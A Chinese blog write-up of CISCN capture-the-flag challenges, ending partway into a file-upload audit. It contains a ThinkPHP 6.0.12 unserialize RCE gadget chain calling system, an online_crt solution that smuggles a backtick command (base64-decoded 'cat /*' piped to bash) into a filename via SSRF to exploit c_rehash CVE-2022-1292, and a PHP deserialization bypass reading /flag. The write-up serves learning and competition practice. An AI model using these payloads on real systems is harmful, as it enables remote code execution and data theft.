<p>可以看到这里有反序列化入口点，加上如下图，直接暴露了版本，那上网找现成的pop即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302094137727.png" alt="image-20240302094137727"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>{
    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span>{
        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">lazySave</span> = <span class="hljs-title class_">false</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [];
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$json</span> = [];
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$jsonAssoc</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">''</span></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;lazySave = True;
            <span class="hljs-variable language_">$this</span>-&gt;data = [<span class="hljs-string">'whoami'</span> =&gt; [<span class="hljs-string">'ls /'</span>]];
            <span class="hljs-variable language_">$this</span>-&gt;exists = True;
            <span class="hljs-variable language_">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;
            <span class="hljs-variable language_">$this</span>-&gt;withAttr = [<span class="hljs-string">'whoami'</span> =&gt; [<span class="hljs-string">'system'</span>]];
            <span class="hljs-variable language_">$this</span>-&gt;json = [<span class="hljs-string">'whoami'</span>,[<span class="hljs-string">'whoami'</span>]];
            <span class="hljs-variable language_">$this</span>-&gt;jsonAssoc = True;
        }
    }
}
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>{
    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>{
    }
}

<span class="hljs-keyword">namespace</span>{
    <span class="hljs-title class_">echo</span>(<span class="hljs-title class_">urlencode</span>(<span class="hljs-title class_">serialize</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>()))));
}</code></pre>
<p>根据文章所说以及代码，我们找到index.php/index/test下直接post传入参数a即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302095222394.png" alt="image-20240302095222394"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302095255581.png" alt="image-20240302095255581"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">ThinkPHP6.0.12LTS反序列漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/issues/2717">ThinkPHP 6.0.12 Unserialize RCE</a></p>
<h1 id="ciscn-2022-初赛online_crt">[CISCN 2022 初赛]online_crt</h1>
<p>跟着附件我们看到后端是由Python和golang处理的，先看python</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_crt</span>(<span class="hljs-params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):
    root_key = rsa.generate_private_key(
        public_exponent=<span class="hljs-number">65537</span>,
        key_size=<span class="hljs-number">2048</span>,
        backend=default_backend()
    )
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),
        x509.NameAttribute(NameOID.LOCALITY_NAME, City),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),
        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),
        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),
    ])
    root_cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        root_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="hljs-number">3650</span>)
    ).sign(root_key, hashes.SHA256(), default_backend())
    crt_name = <span class="hljs-string">"static/crt/"</span> + <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">".crt"</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(crt_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
        f.write(root_cert.public_bytes(serialization.Encoding.PEM))
    <span class="hljs-keyword">return</span> crt_name</code></pre>
<p>上述代码是用来生成crt证书的</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/getcrt'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():
    Country = request.form.get(<span class="hljs-string">"Country"</span>, <span class="hljs-string">"CN"</span>)
    Province = request.form.get(<span class="hljs-string">"Province"</span>, <span class="hljs-string">"a"</span>)
    City = request.form.get(<span class="hljs-string">"City"</span>, <span class="hljs-string">"a"</span>)
    OrganizationalName = request.form.get(<span class="hljs-string">"OrganizationalName"</span>, <span class="hljs-string">"a"</span>)
    CommonName = request.form.get(<span class="hljs-string">"CommonName"</span>, <span class="hljs-string">"a"</span>)
    EmailAddress = request.form.get(<span class="hljs-string">"EmailAddress"</span>, <span class="hljs-string">"a"</span>)
    <span class="hljs-keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</code></pre>
<p>这里是用来处理getcrt路由下的get和post方法，在upload函数中通过request.form.get提取form表单中指定参数的内容，如果没有的话，则按默认的来。最后调用get_crt函数生成证书</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/createlink'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():
    json_data = {<span class="hljs-string">"info"</span>: os.popen(<span class="hljs-string">"c_rehash static/crt/ &amp;&amp; ls static/crt/"</span>).read()}
    <span class="hljs-keyword">return</span> json.dumps(json_data)</code></pre>
<p>当访问createlink路由时，会调用popen函数执行<code>c_rehash static/crt/ &amp;&amp; ls static/crt/</code>，并最终将得到的结果按json数据格式返回</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/proxy'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy</span>():
    uri = request.form.get(<span class="hljs-string">"uri"</span>, <span class="hljs-string">"/"</span>)
    client = socket.socket()
    client.connect((<span class="hljs-string">'localhost'</span>, <span class="hljs-number">8887</span>))
    msg = <span class="hljs-string">f'''GET <span class="hljs-subst">{uri}</span> HTTP/1.1</span>
<span class="hljs-string">Host: test_api_host</span>
<span class="hljs-string">User-Agent: Guest</span>
<span class="hljs-string">Accept-Encoding: gzip, deflate</span>
<span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="hljs-string">Connection: close</span>
<span class="hljs-string"></span>
<span class="hljs-string">'''</span>
    client.send(msg.encode())
    data = client.recv(<span class="hljs-number">2048</span>)
    client.close()
    <span class="hljs-keyword">return</span> data.decode()</code></pre>
<p>这里目的是与目标服务器localhost:8887建立连接，在想目标服务器发送http请求之后，返回目标服务器的响应</p>
<p>接着我们看一下go的代码</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">admin</span><span class="hljs-params">(c *gin.Context)</span></span> {
	staticPath := <span class="hljs-string">"/app/static/crt/"</span>
	oldname := c.DefaultQuery(<span class="hljs-string">"oldname"</span>, <span class="hljs-string">""</span>)
	newname := c.DefaultQuery(<span class="hljs-string">"newname"</span>, <span class="hljs-string">""</span>)
	<span class="hljs-keyword">if</span> oldname == <span class="hljs-string">""</span> || newname == <span class="hljs-string">""</span> || strings.Contains(oldname, <span class="hljs-string">".."</span>) || strings.Contains(newname, <span class="hljs-string">".."</span>) {
		c.String(<span class="hljs-number">500</span>, <span class="hljs-string">"error"</span>)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">""</span> &amp;&amp; c.Request.Host == <span class="hljs-string">"admin"</span> {
		err := os.Rename(staticPath+oldname, staticPath+newname)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">return</span>
		}
		c.String(<span class="hljs-number">200</span>, newname)
		<span class="hljs-keyword">return</span>
	}
	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"no"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(c *gin.Context)</span></span> {
	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"hello world"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	router := gin.Default()
	router.GET(<span class="hljs-string">"/"</span>, index)
	router.GET(<span class="hljs-string">"/admin/rename"</span>, admin)

	<span class="hljs-keyword">if</span> err := router.Run(<span class="hljs-string">":8887"</span>); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
}</code></pre>
<p>首先在main函数中。如果访问/路由，则调用index函数；如果访问/admin/rename，则调用admin函数</p>
<p>其中index函数就单纯返回一个字符串；admin函数中首先获取旧的以及新的名字，随后判断其是否为空且字符串中是否包含<code>..</code>防止目录穿越；如果正常的话，接着判断url路径如果不是空，且host为admin则成功执行rename进行名字的更替。</p>
<p>题目中出现了 c_rehash，c_rehash是openssl中的一个用perl编写的脚本工具，用于批量创建证书等文件 hash命名的符号链接，c_rehash 有个命令注入漏洞 (<a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-qjmp-vmxc-7p8r">CVE-2022-1292</a>)，经过搜索网上并没有公开的exp (可能因为这个漏洞非常鸡肋)，只能通过diff进行分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302103834036.png" alt="image-20240302103834036"></p>
<p>这里看不懂代码，看了wp之后说这里的fname没有进行过滤反引号就直接拼接到了上述箭头处的命令中，这意味着如果我们构造一个含有反引号的文件名，即可进行rce。</p>
<p>根据上述的分析以及wp我们可以有个思路，首先就是访问/getcrt获取证书以及文件名，随后就是要构造我们需要进行rce的文件名了，如果构造好并成功执行admin函数之后，我们直接访问createlink路由，其中info函数会通过popen执行我们的文件名，造成rce（ c_rehash 作用是让openssl在证书目录中能够找到证书）</p>
<pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">hash_dir</span> </span>{
    <span class="hljs-keyword">my</span> %hashlist;
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Doing $_[0]\n"</span>;
    <span class="hljs-comment">#将当前目录切换到参数 $_[0] 指定的目录。</span>
    <span class="hljs-keyword">chdir</span> $_[<span class="hljs-number">0</span>];
    <span class="hljs-comment">#使用 opendir 打开目录，并读取该目录下的文件列表，使用 readdir 获取文件列表并按字母顺序排序</span>
    <span class="hljs-keyword">opendir</span>(DIR, <span class="hljs-string">"."</span>);
    <span class="hljs-keyword">my</span> @flist = <span class="hljs-keyword">sort</span> <span class="hljs-keyword">readdir</span>(DIR);
    <span class="hljs-keyword">closedir</span> DIR;
    <span class="hljs-comment">#如果 $removelinks 变量为真，则删除符号链接文件。</span>
    <span class="hljs-keyword">if</span> ( $removelinks ) {
        <span class="hljs-comment"># Delete any existing symbolic links</span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">grep</span> {<span class="hljs-regexp">/^[\da-f]+\.r{0,1}\d+$/</span>} @flist) {
            <span class="hljs-keyword">if</span> (-l $_) {
                <span class="hljs-keyword">print</span> <span class="hljs-string">"unlink $_"</span> <span class="hljs-keyword">if</span> $verbose;
                <span class="hljs-keyword">unlink</span> $_ || <span class="hljs-keyword">warn</span> <span class="hljs-string">"Can't unlink $_, $!\n"</span>;
            }
        }
    }
    <span class="hljs-comment">#对于符合特定文件名模式（以 .pem、.crt、.cer、.crl 结尾）的文件，调用 check_file 子例程检查文件内容是否符合证书或 CRL 格式。</span>
    FILE: <span class="hljs-keyword">foreach</span> $fname (<span class="hljs-keyword">grep</span> {<span class="hljs-regexp">/\.(pem)|(crt)|(cer)|(crl)$/</span>} @flist) {
        <span class="hljs-comment"># Check to see if certificates and/or CRLs present.</span>
        <span class="hljs-keyword">my</span> ($cert, $crl) = check_file($fname);
        <span class="hljs-keyword">if</span> (!$cert &amp;&amp; !$crl) {
            <span class="hljs-keyword">print</span> STDERR <span class="hljs-string">"WARNING: $fname does not contain a certificate or CRL: skipping\n"</span>;
            <span class="hljs-keyword">next</span>;
        }
        link_hash_cert($fname) <span class="hljs-keyword">if</span> ($cert);<span class="hljs-comment">#如果文件包含证书，则调用 link_hash_cert 子例程处理证书。</span>
        link_hash_crl($fname) <span class="hljs-keyword">if</span> ($crl);<span class="hljs-comment">#如果文件包含 CRL，则调用 link_hash_crl 子例程处理 CRL。</span>
    }
}</code></pre>
<h2 id="利用条件">利用条件</h2>
<ol>
<li>执行c_rehash 目标目录下文件可控</li>
<li>文件后缀符合要求</li>
<li>文件内容必须包含证书或者是吊销列表</li>
<li>文件名可控</li>
</ol>
<p>题目中生成证书的功能可以创建一个满足要求的文件</p>
<p>这里要实现文件名可控，重点就是go中的rename函数了，要调用该函数，首先需要绕过</p>
<p><code>if c.Request.URL.RawPath != "" &amp;&amp; c.Request.Host == "admin"</code></p>
<p>这里先看一个go语言URI.URL结构体（找不到原文章，借用师傅的图了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302104834951.png" alt="image-20240302104834951"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302104841760.png" alt="image-20240302104841760"></p>
<p>也就是说url中必须含有待转移的字符，也就是经过url编码的字符，<a target="_blank" rel="noopener" href="https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/">具体也可参考该文章解释</a></p>
<p>接下来先访问getcrt获取证书文件名：static/crt/39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302105135582.png" alt="image-20240302105135582"></p>
<p>接着请求 /proxy 修改证书名为恶意文件名，这里放一些师傅们说的坑点：</p>
<p>linux文件名虽然可以包含大部分可打印字符，但是有一个除外 那就是斜杠，不能使用斜杠这限制了命令执行的内容</p>
<p>这里有位师傅做的是原环境：他当时选择了base64编码以及截断环境变量方式，但由于目标环境的限制无法成功；接着他就使用现有的环境变量</p>
<p>他通过<code>env&gt;qweqwe</code>命令在之后下载的文件看到了有一个变量值为/，接着变成功读取到了（这里就记录一下这种思路）</p>
<pre><code class="hljs scss">uri=/admin%<span class="hljs-number">2</span>frename?oldname=<span class="hljs-number">39</span>d205a5-<span class="hljs-number">79</span>c2-<span class="hljs-number">4</span>f06-<span class="hljs-number">936</span>c-<span class="hljs-number">8</span>adb7f06c6b2<span class="hljs-selector-class">.crt</span>&amp;newname=`ls%<span class="hljs-number">20</span>${OLDPWD}&gt;yghj`<span class="hljs-selector-class">.crt</span></code></pre>
<p>这里我使用的是nssctf的环境，根据wp所述，这里使用base64方法即可</p>
<p>payload为：</p>
<pre><code class="hljs scss">uri=/admin%<span class="hljs-number">2</span>frename?oldname=<span class="hljs-number">39</span>d205a5-<span class="hljs-number">79</span>c2-<span class="hljs-number">4</span>f06-<span class="hljs-number">936</span>c-<span class="hljs-number">8</span>adb7f06c6b2<span class="hljs-selector-class">.crt</span>&amp;newname=`echo%<span class="hljs-number">20</span>Y2F0IC8qIA==|base64%<span class="hljs-number">20</span><span class="hljs-attr">--decode</span>|bash&gt;flag<span class="hljs-selector-class">.txt</span>`<span class="hljs-selector-class">.crt</span></code></pre>
<p>这里需要将/url编码，空格编码接着继续将payload整体进行url编码。因为<code>return data.decode()</code>的存在</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse
uri = <span class="hljs-string">'''/admin%2frename?oldname=a1fdda8f-fbf7-42fd-9092-2d849967c6b5.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt HTTP/1.1</span>
<span class="hljs-string">Host: admin</span>
<span class="hljs-string">'''</span>
gopher = uri.replace(<span class="hljs-string">"\n"</span>,<span class="hljs-string">"\r\n"</span>)
payload = urllib.parse.quote(gopher)
<span class="hljs-built_in">print</span>(payload)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112648852.png" alt="image-20240302112648852"></p>
<p>这里我们访问createlink触发上述代码的执行，之后访问/static/crt/flag.txt即可拿到flag（static目录可读）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112701521.png" alt="image-20240302112701521"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112722938.png" alt="image-20240302112722938"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/">第15届全国大学生信息安全竞赛 online_crt writeup c_rehash(CVE-2022-1292) ciscn 2022</a></p>
<p><a target="_blank" rel="noopener" href="https://miaotony.xyz/2022/05/31/CTF_2022CISCN_preliminary/#toc-heading-4">CTF | 2022 CISCN 初赛 WriteUp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0xo0Kerk/p/17204958.html">[CISCN 2022 初赛]online_crt</a></p>
<h1 id="ciscn-2023-华北ez_date">[CISCN 2023 华北]ez_date</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'no array'</span>);
        }
        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) ){
            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);
            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">'.txt'</span>;
            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);
            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/((\s)*(\n)+(\s)*)/i'</span>,<span class="hljs-string">''</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));
            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>();
        }
    }
}

<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>]));</code></pre>
<p>简单的反序列化，这里的正则表达式的作用就是将文件内容中所有连续的空格、换行和空白字符替换为空字符串。重点就是绕过第二个if语句。</p>
<p>这里的第一个if条件语句让我们无法通过数据绕过下面的md5强等，看了wp说可以利用数字和字符来绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144515978.png" alt="image-20240302144515978"></p>
<p>另一个是date函数的绕过：date函数会对特定的字母转化为特定的时间表达格式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144636962.png" alt="image-20240302144636962"></p>
<p>因此构造payload如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();
<span class="hljs-variable">$pop</span>-&gt;a = <span class="hljs-string">'1'</span>;
<span class="hljs-variable">$pop</span>-&gt;b = <span class="hljs-number">1</span>;
<span class="hljs-variable">$pop</span>-&gt;file = <span class="hljs-string">"/f\l\a\g"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144953252.png" alt="image-20240302144953252"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73668856/article/details/134893842">（反序列化）小记录</a></p>
<h1 id="ciscn-2023-西南do_you_like_read">[CISCN 2023 西南]do_you_like_read</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302153843422.png" alt="image-20240302153843422"></p>
<p>点击登陆之后，根据提示用户名是admin，这里可以进行密码爆破，当然运气好直接弱口令：admin123即可登录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302153949857.png" alt="image-20240302153949857"></p>
<p>进去之后可以发现含有文件上传，文件编辑以及删除等功能，我们先尝试文件上传，但由于这是白盒审计，我们先看看上传文件代码如何写</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'name'</span>] != <span class="hljs-string">""</span>) {
    <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'name'</span>];
    <span class="hljs-comment">// 检查文件名的扩展名是否已经是".php"</span>
    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$image</span>, PATHINFO_EXTENSION);
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'php'</span>|| <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'phtml'</span> || <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'php5'</span> || <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'php2'</span>) {
        <span class="hljs-comment">// 将文件名的扩展名替换为".jpg"</span>
        <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$image</span>, PATHINFO_FILENAME) . <span class="hljs-string">'.jpg'</span>;
    }
    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) != <span class="hljs-string">'jpg'</span>) {
        <span class="hljs-comment">// 忽略其他后缀名并不做修改</span>
        <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'name'</span>];
    }
    <span class="hljs-variable">$directory_self</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'PHP_SELF'</span>]), <span class="hljs-string">''</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'PHP_SELF'</span>]);
    <span class="hljs-variable">$uploadDirectory</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'DOCUMENT_ROOT'</span>] . <span class="hljs-variable">$directory_self</span> . <span class="hljs-string">"bootstrap/img/"</span>;
    <span class="hljs-variable">$uploadDirectory</span> .= <span class="hljs-variable">$image</span>;
    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$uploadDirectory</span>);
}</code></pre>
